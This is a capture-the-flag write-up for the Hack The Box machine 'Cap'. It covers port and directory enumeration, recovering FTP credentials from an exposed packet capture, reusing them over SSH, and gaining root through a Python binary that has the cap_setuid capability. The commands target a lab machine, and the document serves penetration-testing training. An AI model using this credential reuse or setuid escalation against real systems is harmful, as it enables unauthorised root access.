---
title: Cap
parent: HTB
grand_parent: Writeups
nav_order: 3
---
```zsh
nmap -Pn -p- 10.129.49.120 -oN full_port --min-rate=5000
```
![[Pasted image 20260503191242.png]]

```zsh
nmap -Pn -p21,22,80 -sCV -A 10.129.49.120 -oN port_service --min-rate=5000
```
![[Pasted image 20260503191317.png]]
![[Pasted image 20260503223119.png]]
/data/3 -> 3.pcap
![[Pasted image 20260503223214.png]]
3pcap data exist

## FTP 21
# Anonymous_Login
```zsh
ftp 10.129.49.120
```
![[Pasted image 20260503201548.png]]
Failed

# Searchsploit
```zsh
searchsploit
```
![[Pasted image 20260503201832.png]]

## HTTP 80
# Enum Directory
```zsh
gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,xml -b 403,404
```

# Browser Access
http://cap.htb
![[Pasted image 20260503202109.png]]

![[Pasted image 20260503231719.png]]
data/
- 0
- 1
- 2
- 3

---

# Initial Access
Download http://cap.htb/data/0
![[Pasted image 20260503231821.png]]


![[Pasted image 20260503232253.png]]
nathan
Buck3tH4TFORM3!
```zsh
ftp cap.htb
```
![[Pasted image 20260503232641.png]]

# Same as FTP Password
```zsh
ssh nathan@cap.htb
```
Buck3tH4TF0RM3!
![[Pasted image 20260503233557.png]]

---

# Privilege Escalation

# linpeas.sh
![[Pasted image 20260503234536.png]]

![[Pasted image 20260503235120.png]]
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e
```zsh
python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
root
0
>>> os.system('sh')
```
![[Pasted image 20260503235833.png]]